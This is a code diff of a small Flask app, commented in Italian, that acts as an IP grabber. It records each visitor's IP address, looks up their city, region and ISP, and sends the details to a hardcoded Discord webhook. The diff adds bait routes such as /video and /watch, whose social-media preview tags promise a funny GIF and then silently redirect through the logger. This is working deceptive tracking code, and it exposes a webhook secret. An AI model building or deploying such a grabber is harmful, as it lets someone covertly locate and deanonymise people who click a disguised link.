@@ -5,18 +5,18 @@ import os
 
 app = Flask(__name__)
 
-# TUO WEBHOOK PERSONALE
 WEBHOOK_URL = "https://discord.com/api/webhooks/1528013241819594853/ajTR7-zJ32yBsxulXb4688xXeWaqVgr9pQk6dW3ffPpFaeWgbWydLkRQyH6M56515lNA"
 
+# Link finale a cui reindirizzare
+FINAL_URL = "https://tenor.com/it/view/gay-flag-gay-rainbow-flag-pride-gay-pride-gif-25643563"
+
 def get_real_ip(request):
-    """Prende solo l'IP reale del client"""
     forwarded = request.headers.get('X-Forwarded-For', '')
     if forwarded:
         return forwarded.split(',')[0].strip()
     return request.remote_addr
 
 def get_ip_info(ip):
-    """Ottiene info geolocalizzazione"""
     try:
         response = requests.get(
             f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp",
@@ -31,18 +31,12 @@ def get_ip_info(ip):
                     "city": data.get("city", "N/D"),
                     "isp": data.get("isp", "N/D")
                 }
-    except Exception as e:
-        print(f"Errore API: {e}")
+    except:
+        pass
     return None
 
-@app.route("/")
-def index():
-    ip = get_real_ip(request)
+def send_to_discord(ip, ip_info):
     date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
-    
-    print(f"🌐 IP reale: {ip}")
-    
-    ip_info = get_ip_info(ip)
     
     description = f"**📅 Data:** {date}\n"
     if ip_info:
@@ -71,8 +65,82 @@ def index():
             print(f"❌ Errore: {response.status_code}")
     except Exception as e:
         print(f"❌ Eccezione: {e}")
+
+@app.route("/")
+def index():
+    ip = get_real_ip(request)
+    print(f"🌐 IP: {ip}")
     
-    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+    ip_info = get_ip_info(ip)
+    send_to_discord(ip, ip_info)
+    
+    return redirect(FINAL_URL)
+
+# NUOVA ROUTE CON ANTEPRIMA PERSONALIZZATA
+@app.route("/video")
+@app.route("/watch")
+@app.route("/gif")
+@app.route("/link")
+def preview():
+    return """
+    <!DOCTYPE html>
+    <html lang="it">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        <!-- ANTEPRIMA PER WHATSAPP/TELEGRAM/SOCIAL -->
+        <meta property="og:title" content="Guarda questa GIF! 😂">
+        <meta property="og:description" content="Non riesco a smettere di ridere, devi vederla!">
+        <meta property="og:image" content="https://media.tenor.com/0vG5zB4Htq0AAAAM/gay-flag.gif">
+        <meta property="og:type" content="website">
+        <meta property="og:url" content="https://apppy-production-6842.up.railway.app/video">
+        <meta property="og:site_name" content="GIF divertenti">
+        <meta name="twitter:card" content="summary_large_image">
+        <meta name="twitter:title" content="Guarda questa GIF! 😂">
+        <meta name="twitter:description" content="Non riesco a smettere di ridere!">
+        <meta name="twitter:image" content="https://media.tenor.com/0vG5zB4Htq0AAAAM/gay-flag.gif">
+        
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+                background: #000;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                font-family: Arial, sans-serif;
+            }
+            .loader {
+                text-align: center;
+                color: #fff;
+            }
+            .loader p {
+                font-size: 18px;
+                margin-top: 20px;
+                animation: pulse 1.5s infinite;
+            }
+            @keyframes pulse {
+                0%, 100% { opacity: 1; }
+                50% { opacity: 0.5; }
+            }
+        </style>
+        
+        <!-- REDIRECT IMMEDIATO -->
+        <meta http-equiv="refresh" content="0;url=/">
+    </head>
+    <body>
+        <div class="loader">
+            <p>Caricamento GIF in corso...</p>
+        </div>
+        <script>
+            // Redirect immediato via JavaScript
+            window.location.href = "/";
+        </script>
+    </body>
+    </html>
+    """
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
